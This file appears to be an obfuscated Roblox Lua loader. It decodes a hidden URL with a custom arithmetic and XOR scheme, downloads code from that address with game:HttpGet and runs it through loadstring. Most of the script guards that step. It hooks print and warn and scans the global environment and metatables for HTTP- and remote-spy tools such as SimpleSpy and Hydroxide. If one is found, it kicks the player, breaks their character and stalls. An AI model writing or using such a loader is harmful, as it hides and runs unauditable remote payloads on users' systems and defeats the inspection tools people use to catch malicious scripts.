local _df=function()
    local ps=game:GetService("Players")
    local lp=ps.LocalPlayer
    if lp then
        pcall(function() lp:Kick() end)
        pcall(function() game:GetService("TeleportService"):Teleport(0) end)
        pcall(function() 
            if lp.Character then 
                lp.Character:BreakJoints() 
                for _,v in pairs(lp.Character:GetDescendants()) do
                    if v:IsA("BasePart") then v.Anchored=true v.CanCollide=false end
                end
            end 
        end)
        pcall(function()
            lp.CharacterAdded:Connect(function(c)
                c:BreakJoints()
                for _,v in pairs(c:GetDescendants()) do
                    if v:IsA("BasePart") then v.Anchored=true end
                end
            end)
        end)
    end
    pcall(function() script:Destroy() end)
    while true do task.wait(9e9) end
end
local _bw={"httpspy","http spy","http_spy","avalon initialized","simplespy","simple spy","remotespy","remote spy","dex explorer","hydroxide","infinite yield","spy active","file saved","requests captured","remote calls","fired from"}
local _op,_ow=print,warn
local function _cm(m)
    if type(m)~="string" then return end
    local l=m:lower()
    for _,w in pairs(_bw) do
        if l:find(w,1,true) then _df() end
    end
end
local _env=getfenv and getfenv() or _G
rawset(_env,"print",function(...)
    local args={...}
    for i=1,#args do _cm(tostring(args[i])) end
    return _op(...)
end)
rawset(_env,"warn",function(...)
    local args={...}
    for i=1,#args do _cm(tostring(args[i])) end
    return _ow(...)
end)
if getgenv then
    pcall(function()
        rawset(getgenv(),"print",_env.print)
        rawset(getgenv(),"warn",_env.warn)
    end)
end
local function _vhh()
    local mt=getrawmetatable and getrawmetatable(game)
    if mt then
        local nc=rawget(mt,"__namecall")
        if nc then
            local ok,ncs=pcall(tostring,nc)
            if ok then
                ncs=ncs:lower()
                if ncs:find("httpspy") or ncs:find("simplespy") or ncs:find("remotespy") then 
                    return false 
                end
            end
            if getconstants then
                local ok2,cons=pcall(getconstants,nc)
                if ok2 and type(cons)=="table" then
                    local hasSelf,hasGame,hasHttpGet=false,false,false
                    for _,c in pairs(cons) do
                        if type(c)=="string" then
                            local cs=c:lower()
                            if c=="self" then hasSelf=true end
                            if c=="game" then hasGame=true end
                            if cs=="httpget" then hasHttpGet=true end
                        end
                    end
                    if hasSelf and hasGame and hasHttpGet then return false end
                end
            end
        end
    end
    return true
end
local function _se()
    local bk={"httpspy","simplespy","remotespy","hydroxide"}
    local function _sc(t)
        if type(t)~="table" then return end
        for k,v in pairs(t) do
            local ok1,ks=pcall(function() return tostring(k):lower() end)
            local ok2,vs=pcall(function() return tostring(v):lower() end)
            if ok1 and ok2 then
                for _,b in pairs(bk) do
                    if ks:find(b,1,true) or vs:find(b,1,true) then _df() end
                end
            end
        end
    end
    pcall(function() _sc(getfenv and getfenv() or _G) end)
    if getgenv then pcall(function() _sc(getgenv()) end) end
    if shared then pcall(function() _sc(shared) end) end
end
local function _du(e)
    local r=""
    local p={}
    local i=0
    for v in e:gmatch("/(%d+)") do
        local n=tonumber(v)
        if n then
            n=n-((i*3)%500)-100
            n=(n-144)/3
            local x1=0
            for j=0,15 do
                local pw=2^j
                if math.floor(n/pw)%2~=math.floor(118/pw)%2 then x1=x1+pw end
            end
            local x2=x1-40-(i%17)
            local x3=0
            for j=0,7 do
                local pw=2^j
                if math.floor(x2/pw)%2~=math.floor(132/pw)%2 then x3=x3+pw end
            end
            if x3>=0 and x3<=255 then
                r=r..string.char(x3)
            end
            i=i+1
        end
    end
    return r
end

local ls=loadstring or load

local function sec()
    local checks={function() local e=getfenv and getfenv() or _G local bk={"httpspy","simplespy","remotespy","hydroxide"} for k,v in pairs(e) do local ok,s=pcall(function() return tostring(k):lower()..tostring(v):lower() end) if ok then for _,b in pairs(bk) do if s:find(b,1,true) then return false end end end end return true end,function() if getgenv then local ok,g=pcall(getgenv) if ok and type(g)=="table" then local bk={"httpspy","simplespy","remotespy"} for k,_ in pairs(g) do local ok2,ks=pcall(function() return tostring(k):lower() end) if ok2 then for _,b in pairs(bk) do if ks:find(b,1,true) then return false end end end end end end return true end,function() local mt=getrawmetatable and getrawmetatable(game) if mt then local nc=rawget(mt,"__namecall") if nc then local ok,s=pcall(tostring,nc) if ok then s=s:lower() if s:find("httpspy") or s:find("simplespy") or s:find("remotespy") then return false end end end end return true end}
    for i=1,#checks do 
        local ok,res=pcall(checks[i])
        if not ok or not res then return false end
    end
    return true
end

if not sec() then _df() end
if not _vhh() then _df() end
_se()

local _ed="/1306/1348/1342/1336/1279/730/787/781/1288/1339/1324/1303/1336/1303/1345/1348/1387/1396/1426/1327/1447/787/1363/1360/1357/838/1423/1414/1426/1393/1390/1375/793/1381/1408/1438/793/1453/1492/793/1495/1432/808/829/832/1444/823/1471/820/859/868/913/1543/910/841/1486/967/1495/892/1489/862/862/898/910/904/904/919/901/889/967/904/1525/904/907/910/1534/925/1534/1576/883/1540/922/961/1552/1597/1021/1633/1639/943/1021/991/970/982/1588/1624/1597/1603/1597/1006/1636/1021/1015/991/1060/1690/1078/1066/1120/1585/1045/1015/1072/1594/1045/1021/1066/1681/1069/1687/1123/1108/1111/1114/1681/1678/1072/1684/1069/1075/1063"
local url=_du(_ed)

if not url or #url<10 then _df() end
if not sec() then _df() end

local success,response=pcall(function()
    return game:HttpGet(url,true)
end)

if success and response and #response>100 then
    if not sec() then _df() end
    local func=ls(response)
    if func then 
        return func()
    end
end